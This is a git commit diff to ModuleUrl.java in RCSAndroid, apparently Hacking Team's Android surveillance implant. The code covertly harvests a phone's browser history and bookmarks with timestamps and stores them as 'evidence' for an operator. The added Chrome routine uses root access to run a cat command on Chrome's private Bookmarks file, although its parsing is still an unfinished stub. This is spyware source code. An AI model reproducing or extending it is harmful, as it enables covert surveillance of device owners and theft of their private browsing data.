47b9649afad7c807b0c79244425effd5c5d403c4
Zeno <zeno@hackingteam.com>
2015-04-14 16:30:23 +0200

    Added schel for chrome bookmarks

--- RCSAndroid/src/com/android/dvci/module/ModuleUrl.java
+++ RCSAndroid/src/com/android/dvci/module/ModuleUrl.java
@@ -9,13 +9,8 @@
 
 package com.android.dvci.module;
 
-import android.content.Context;
 import android.database.Cursor;
-import android.os.Handler;
-import android.os.Looper;
 import android.provider.Browser;
-import android.text.ClipboardManager;
-import android.view.ViewDebug;
 
 import com.android.dvci.ProcessInfo;
 import com.android.dvci.ProcessStatus;
@@ -24,18 +19,27 @@ import com.android.dvci.auto.Cfg;
 import com.android.dvci.conf.ConfModule;
 import com.android.dvci.evidence.EvidenceBuilder;
 import com.android.dvci.evidence.EvidenceType;
+import com.android.dvci.evidence.Markup;
 import com.android.dvci.interfaces.IncrementalLog;
 import com.android.dvci.interfaces.Observer;
 import com.android.dvci.listener.ListenerProcess;
-import com.android.dvci.module.BaseModule;
 import com.android.dvci.util.ByteArray;
 import com.android.dvci.util.Check;
 import com.android.dvci.util.DateTime;
+import com.android.dvci.util.Execute;
+import com.android.dvci.util.ExecuteResult;
 import com.android.dvci.util.StringUtils;
-import com.android.dvci.util.Utils;
 import com.android.dvci.util.WChar;
 
+import org.json.JSONObject;
+import org.w3c.dom.Document;
+import org.w3c.dom.Element;
+import org.w3c.dom.NodeList;
+
 import java.util.ArrayList;
+import java.util.Date;
+
+import javax.xml.parsers.DocumentBuilderFactory;
 
 
 public class ModuleUrl extends BaseModule implements IncrementalLog, Observer<ProcessInfo> {
@@ -43,10 +47,14 @@ public class ModuleUrl extends BaseModule implements IncrementalLog, Observer<Pr
 	private static final String TAG = "ModuleUrl"; //$NON-NLS-1$
 
 	int VERSION_DELIMITER = 0x20100713;
+	private Markup markupUrl;
+	//private long lastTimestamp;
 
 	@Override
 	public void actualStart() {
-		saveUrls();
+		markupUrl = new Markup(this);
+
+		saveUrls(true, true);
 		ListenerProcess.self().attach(this);
 	}
 
@@ -65,40 +73,76 @@ public class ModuleUrl extends BaseModule implements IncrementalLog, Observer<Pr
 	public void actualGo() {
 
 	}
-	
-	private void getClipboard() {
 
-	}
+	private synchronized long saveUrlsBrowser(long lastTimestamp) {
 
-	void saveUrls(){
 		if (Cfg.DEBUG) {
-			Check.log(TAG + " (saveUrls), ");
+			Check.log(TAG + " (saveUrls), timestamp: " + lastTimestamp);
 		}
-		String[] proj = new String[] { Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL };
-		String sel = Browser.BookmarkColumns.BOOKMARK + " = 0"; // 0 = history, 1 = bookmark
+
+		String[] proj = new String[]{Browser.BookmarkColumns.TITLE, Browser.BookmarkColumns.URL, Browser.BookmarkColumns.BOOKMARK, Browser.BookmarkColumns.DATE};
+		String sel = Browser.BookmarkColumns.DATE + " > " + lastTimestamp;
+		//String sel = null;
 		Cursor mCur = Status.getContentResolver().query(Browser.BOOKMARKS_URI, proj, sel, null, null);
 		mCur.moveToFirst();
-		@SuppressWarnings("unused")
-		String title = "";
-		@SuppressWarnings("unused")
-		String url = "";
-		if (mCur.moveToFirst() && mCur.getCount() > 0) {
-			boolean cont = true;
-			while (mCur.isAfterLast() == false && cont) {
-				title = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.TITLE));
-				url = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.URL));
-				// Do something with title and url
-				if (Cfg.DEBUG) {
-					Check.log(TAG + " (saveUrls), " + title + " url: " + url);
-				};
 
-				saveEvidence(title, url);
-				mCur.moveToNext();
+		long maxTimestamp = lastTimestamp;
+
+		try {
+			if (mCur.moveToFirst() && mCur.getCount() > 0) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (saveUrls), records: " + mCur.getCount());
+				}
+				while (mCur.isAfterLast() == false) {
+					String title = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.TITLE));
+					String url = mCur.getString(mCur.getColumnIndex(Browser.BookmarkColumns.URL));
+					boolean bookmark = mCur.getInt(mCur.getColumnIndex(Browser.BookmarkColumns.BOOKMARK)) == 1; // 0 = history, 1 = bookmark
+					long timestamp = mCur.getLong(mCur.getColumnIndex(Browser.BookmarkColumns.DATE));
+					maxTimestamp = Math.max(timestamp, maxTimestamp);
+
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (saveUrls), " + title + " url: " + url + " bookmark: " + bookmark + " timestamp: " + timestamp);
+					}
+
+					saveEvidence(title, url, bookmark, new Date(timestamp));
+					mCur.moveToNext();
+				}
+			}
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (saveUrls), ERROR", ex);
 			}
 		}
+
+		return maxTimestamp;
+
 	}
 
-	private void saveEvidence(String title, String url) {
+
+	private synchronized long saveUrlsChrome(long lastTimestamp) {
+
+		///data/data/com.android.chrome/app_chrome/Default/Bookmarks
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (saveUrlsChromer), timestamp: " + lastTimestamp);
+		}
+
+		if(Status.haveRoot()){
+			ExecuteResult res = Execute.executeRoot("cat /data/data/com.android.chrome/app_chrome/Default/Bookmarks");
+			String js = res.getStdout();
+			try {
+				JSONObject obj = new JSONObject(js);
+				//obj.
+			} catch (Exception e) {
+				if (Cfg.DEBUG) {
+					Check.log(TAG + " (openBBMChatEnc), ERROR", e);
+				}
+			}
+		}
+
+		return lastTimestamp;
+	}
+
+	private void saveEvidence(String title, String url, boolean bookmark, Date date) {
 
 		//BROWSER_TYPE = ['Unknown', 'Internet Explorer', 'Firefox', 'Opera', 'Safari', 'Chrome', 'Mobile Safari', 'Browser', 'Web']
 		int BROWSER_TYPE = 8;
@@ -108,13 +152,13 @@ public class ModuleUrl extends BaseModule implements IncrementalLog, Observer<Pr
 		final byte[] b_title = WChar.getBytes(title, true); //$NON-NLS-1$
 		//final byte[] b_window = WChar.getBytes("", true); //$NON-NLS-1$
 		final ArrayList<byte[]> items = new ArrayList<byte[]>();
-		
+
 		EvidenceBuilder evidence;
-		
+
 		synchronized (this) {
 			evidence = new EvidenceBuilder(EvidenceType.URL);
 		}
-		
+
 		items.add(b_tm);
 		items.add(ByteArray.intToByteArray(VERSION_DELIMITER));
 		items.add(b_url);
@@ -125,7 +169,7 @@ public class ModuleUrl extends BaseModule implements IncrementalLog, Observer<Pr
 		if (Cfg.DEBUG) {
 			Check.asserts(evidence != null, "null log"); //$NON-NLS-1$
 		}
-		
+
 		synchronized (this) {
 			evidence.write(items);
 			evidence.close();
@@ -140,11 +184,30 @@ public class ModuleUrl extends BaseModule implements IncrementalLog, Observer<Pr
 		// Do nothing, this log is not incremental anymore
 	}
 
+	void saveUrls(boolean browser, boolean chrome) {
+		long lastTimestamp = markupUrl.unserialize(new Long(-1));
+		long m1 = 0, m2 = 0;
+		if (browser) {
+			m1 = saveUrlsBrowser(lastTimestamp);
+		}
+		if (chrome) {
+			m2 = saveUrlsChrome(lastTimestamp);
+		}
+
+		markupUrl.serialize(Math.max(m1, m2));
+	}
+
 	@Override
 	public int notification(ProcessInfo info) {
-		if(info.status == ProcessStatus.STOP && info.processInfo.contains("browser")){
-			saveUrls();
+		if (info.status == ProcessStatus.STOP) {
+
+			boolean browser = info.processInfo.contains("browser");
+			boolean chrome = info.processInfo.contains("chrome");
+			if (browser || chrome) {
+				saveUrls(browser, chrome);
+			}
 		}
+
 		return 0;
 	}
 }
